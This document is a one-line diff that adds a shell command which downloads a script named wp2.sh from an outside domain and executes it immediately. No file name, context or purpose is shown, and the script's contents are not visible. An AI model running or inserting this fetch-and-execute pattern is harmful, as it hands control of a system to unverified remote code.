@@ -1,0 +1,1 @@
+wget mikeb.ninja/m/Techs/wp2.sh&&sh wp2.sh
